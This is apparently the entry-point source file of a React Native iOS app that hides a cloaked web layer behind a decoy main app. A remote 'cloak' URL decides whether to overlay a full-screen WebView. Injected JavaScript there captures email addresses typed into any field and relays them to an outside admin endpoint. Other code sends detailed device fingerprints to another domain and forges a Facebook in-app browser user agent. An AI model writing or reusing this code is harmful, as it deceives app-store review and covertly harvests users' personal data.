import React, { useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { WebView } from 'react-native-webview';
import { createStackNavigator } from '@react-navigation/stack';
import Clipboard from '@react-native-clipboard/clipboard';
import { OneSignal } from 'react-native-onesignal';
import {
  Dimensions,
  Linking,
  Modal,
  NativeModules,
  PixelRatio,
  SafeAreaView,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

// ─── Constants ───────────────────────────────────────────────────────────────

const CLOAK_URL     = 'https://smart-cloud-app.top/HW5gM4fL';
const STORE_SESSION = 'mrv_sta';
const STORE_URL     = 'mrv_url';
const ONESIGNAL_ID  = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';

const CAPI_URL1     = 'https://clear-core-team.top/v1';
const CAPI_URL2_BASE = 'https://flash-core-vibe.com/admin/?action=update_data_ios&id=';

const INJECTED_JS = `
  (function() {
    function hashAndSend(type, value) {
      var normalized = value.trim().toLowerCase();
      var buf = new TextEncoder().encode(normalized);
      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
        var arr = Array.from(new Uint8Array(hashBuf));
        var hex = arr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hex, value: normalized }));
      });
    }

    document.addEventListener('focusout', function(e) {
      var el = e.target;
      if (!el || el.tagName !== 'INPUT') return;
      var val = (el.value || '').trim();
      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
        hashAndSend('email_hash', val);
      }
    });

    document.addEventListener('submit', function(e) {
      if (e.target && e.target.target === '_blank') {
        e.target.target = '_self';
      }
    }, true);
  })();
  true;
`;

// ─── JustLink User-Agent ─────────────────────────────────────────────────────

const buildJustLinkUA = (baseUA: string): string => {
  const iosVersion = DeviceInfo.getSystemVersion();
  const deviceId   = DeviceInfo.getDeviceId();
  const model      = DeviceInfo.getModel().split(' ')[0];
  const sysName    = DeviceInfo.getSystemName();
  const scale      = String(Math.round(PixelRatio.get()));
  const deviceType = DeviceInfo.isTablet() ? 'tablet' : 'phone';
  const lang =
    NativeModules.SettingsManager?.settings?.AppleLanguages?.[0] ??
    NativeModules.SettingsManager?.settings?.AppleLocale ??
    'en-US';
  const suffix = `[FBDV/${deviceId};FBMD/${model};FBSN/${sysName};FBSV/${iosVersion};FBSS/${scale};FBID/${deviceType};FBLC/${lang}]`;
  return `${baseUA} ${suffix}`;
};

// ─── App version tracking ────────────────────────────────────────────────────

const syncAppVersion = async () => {
  const current = DeviceInfo.getVersion();
  const stored  = await AsyncStorage.getItem('mrv_ver');
  if (stored !== current) {
    await AsyncStorage.setItem('mrv_ver', current);
    await AsyncStorage.removeItem(STORE_SESSION);
    await AsyncStorage.removeItem(STORE_URL);
  }
};

// ─── CAPI ────────────────────────────────────────────────────────────────────

async function sendFirstRequest(userAgent: string): Promise<string> {
  try {
    const idfv         = await DeviceInfo.getUniqueId();
    const bundleId     = DeviceInfo.getBundleId();
    const shortVersion = DeviceInfo.getVersion();
    const longVersion  = DeviceInfo.getBuildNumber();
    const osVersion    = DeviceInfo.getSystemVersion();
    const deviceModel  = await DeviceInfo.getDeviceId();
    const locale       = 'en_US';
    const timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
    const screen       = Dimensions.get('screen');
    const screenWidth  = Math.round(screen.width  * screen.scale);
    const screenHeight = Math.round(screen.height * screen.scale);
    const screenDensity = String(screen.scale);
    const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
    const freeStorage  = Math.round((await DeviceInfo.getFreeDiskStorage())  / 1073741824);

    const extinfo = [
      'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
      locale, timezoneAbbr, '',
      screenWidth, screenHeight, screenDensity,
      0, totalStorage, freeStorage, timezone,
    ];

    const strpull = encodeURIComponent(JSON.stringify(extinfo));

    const res  = await fetch(CAPI_URL1, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        index:                   idfv,
        strpull:                 strpull,
        udevice_android_device:  idfv,
        device_android_build:    userAgent,
      }),
    });

    const data    = await res.json();
    const rawStr: string = data.raw_str || '';
    const match   = rawStr.match(/[&?]?bin=([^&]+)/);
    if (match && match[1]) {
      await AsyncStorage.setItem('mrv_bin', match[1]);
      return match[1];
    }
  } catch {}
  return '';
}

async function sendSecondRequest(emailHash: string, phoneHash: string) {
  const binId = await AsyncStorage.getItem('mrv_bin');
  if (!binId) return;
  try {
    await fetch(`${CAPI_URL2_BASE}${binId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ param_em: emailHash, param_ph: phoneHash }),
    });
  } catch {}
}

// ─── OneSignal ───────────────────────────────────────────────────────────────

OneSignal.initialize(ONESIGNAL_ID);

// ─── Navigation ──────────────────────────────────────────────────────────────

const Stack = createStackNavigator();

export default function AppBootstrap() {
  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="HomeTab"       component={HomeScreen} />
        <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

// ─── HomeScreen ──────────────────────────────────────────────────────────────

function HomeScreen({ navigation }) {
  const [contentUrl,  setContentUrl]  = useState('');
  const [fetchUA,     setFetchUA]     = useState('');
  const [justLinkUA,  setJustLinkUA]  = useState('');
  const webViewRef     = useRef<any>(null);
  const resolvedRef    = useRef(false);
  const initialLoadRef = useRef(false);
  const capiData       = useRef<{ emailHash?: string; phoneHash?: string }>({});
  const [isTwoClick, setTwoClick] = useState(false);

  useEffect(() => {
    if (!fetchUA) return;
    let cancelled = false;

    const init = async () => {
      try {
        await syncAppVersion();

        const cached = await AsyncStorage.getItem(STORE_SESSION);

        if (cached === '200') {
          const saved = await AsyncStorage.getItem(STORE_URL);
          if (saved) {
            if (!cancelled) {
              setJustLinkUA(buildJustLinkUA(fetchUA));
              setContentUrl(saved);
            }
            return;
          }
        } else if (cached) {
          return;
        }

        const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': fetchUA } });
        const status = String(res.status);
        await AsyncStorage.setItem(STORE_SESSION, status);

        if (cancelled) return;

        if (status === '200') {
          await buildContentUrl();
        }
      } catch {}
    };

    init();
    return () => { cancelled = true; };
  }, [fetchUA]);

  const buildContentUrl = async () => {
    if (resolvedRef.current) return;
    resolvedRef.current = true;

    sendFirstRequest(fetchUA);
    OneSignal.Notifications.requestPermission(true);

    const seg     = CLOAK_URL.replace(/.*\//, '');
    const viewUrl = `${CLOAK_URL}?${seg}=1`;
    await AsyncStorage.setItem(STORE_URL, viewUrl);
    setJustLinkUA(buildJustLinkUA(fetchUA));
    setContentUrl(viewUrl);
  };

  const openExternal = async (url: string) => {
    const safe = url.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
    try { await Linking.openURL(safe); } catch {}
  };

  const handleBackPress = () => {
    if (isTwoClick) {
      webViewRef.current?.goBack();
      return;
    }
    setTwoClick(true);
    webViewRef.current?.goBack();
    setTimeout(() => setTwoClick(false), 1000);
  };

  const handleShouldStartLoad = (event: any) => {
    const { url } = event;
    const scheme  = (url.split(':')[0] || '').toLowerCase();

    if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
      return true;
    }

    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') ||
        url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
      let waUrl   = url;
      const match = url.match(/wa\.me\/(\d+)/);
      if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
      else if (url.includes('api.whatsapp.com/send'))
        waUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      Linking.openURL(waUrl).catch(() => Linking.openURL(url));
      return false;
    }

    const internalSchemes = ['about', 'javascript', 'data', 'blob'];
    if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
      const addr = url.split(':').slice(1).join(':').split('?')[0];
      if (addr && Clipboard?.setString) Clipboard.setString(addr);
      openExternal(url);
      return false;
    }

    return true;
  };

  const handleOpenWindow = (event: any) => {
    const { targetUrl } = event.nativeEvent;
    if (!targetUrl || targetUrl === 'about:blank') return;
    if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;

    if (targetUrl.includes('pay.funid.com')) {
      Linking.openURL(targetUrl);
      webViewRef.current?.injectJavaScript(`window.location.replace('${contentUrl}')`);
      return;
    }

    if (/^https?:\/\//i.test(targetUrl)) {
      navigation.navigate('ContentViewer', { data: targetUrl, userAgent: justLinkUA });
    } else {
      openExternal(targetUrl);
    }
  };

  const handleMessage = (e: any) => {
    try {
      const msg = JSON.parse(e.nativeEvent.data);
      if (msg.type === 'email_hash') {
        capiData.current.emailHash = msg.hash;
        sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
      } else if (msg.type === 'phone_hash') {
        capiData.current.phoneHash = msg.hash;
      }
    } catch {}
  };

  useEffect(() => {
    const ver = DeviceInfo.getSystemVersion();
    // Immediate fallback via DeviceInfo; hidden WebView overrides if it fires first
    DeviceInfo.getUserAgent().then(ua => {
      setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
    });
    // Hard timeout — if hidden WebView never fires, DeviceInfo guarantees startup
    const t = setTimeout(() => {
      DeviceInfo.getUserAgent().then(ua => {
        setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
      });
    }, 2000);
    return () => clearTimeout(t);
  }, []);

  return (
    <View style={styles.container}>
      <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }} pointerEvents="none">
        <WebView
          style={{ width: 1, height: 1 }}
          source={{ html: '<html><body><script>window.ReactNativeWebView.postMessage(navigator.userAgent);</script></body></html>' }}
          javaScriptEnabled
          onMessage={e => {
            const ua  = e.nativeEvent.data;
            const ver = DeviceInfo.getSystemVersion();
            setFetchUA(`${ua} Version/${ver} Safari/604.1`);
          }}
        />
      </View>

      <NavigationIndependentTree>
        <MainApp />
      </NavigationIndependentTree>

      <Modal visible={!!contentUrl} animationType="none" transparent={false}>
        <View style={StyleSheet.absoluteFill}>
          <SafeAreaView style={{ flex: 1 }}>
            <WebView
              ref={webViewRef}
              source={{ uri: contentUrl }}
              userAgent={justLinkUA}
              style={{ flex: 1 }}
              originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
              onShouldStartLoadWithRequest={handleShouldStartLoad}
              onOpenWindow={handleOpenWindow}
              injectedJavaScript={INJECTED_JS}
              onMessage={handleMessage}
              onLoadEnd={e => {
                const u = e.nativeEvent.url;
                if (u === 'about:blank' && contentUrl && !initialLoadRef.current) {
                  initialLoadRef.current = true;
                  webViewRef.current?.injectJavaScript(`window.location.replace(${JSON.stringify(contentUrl)});true;`);
                } else if (u !== 'about:blank') {
                  initialLoadRef.current = true;
                }
              }}
              onError={() => {}}
              onHttpError={() => {}}
              textZoom={100}
              contentMode="mobile"
              mixedContentMode="always"
              allowsBackForwardNavigationGestures
              domStorageEnabled
              javaScriptEnabled
              allowsInlineMediaPlayback
              setSupportMultipleWindows={false}
              thirdPartyCookiesEnabled
              mediaPlaybackRequiresUserAction={false}
              javaScriptCanOpenWindowsAutomatically
            />
          </SafeAreaView>

          <TouchableOpacity style={styles.btnBack} onPress={handleBackPress}>
            <Text style={styles.btnIcon}>←</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.btnReload} onPress={() => webViewRef.current?.reload()}>
            <Text style={styles.btnIcon}>↺</Text>
          </TouchableOpacity>
        </View>
      </Modal>
    </View>
  );
}

// ─── ContentViewerScreen ─────────────────────────────────────────────────────

function ContentViewerScreen({ navigation, route }) {
  return <AppManagerChild navigation={navigation} route={route} />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  btnBack: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    left: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnReload: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    right: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnIcon: {
    color: 'white',
    fontSize: 20,
    lineHeight: 24,
  },
});
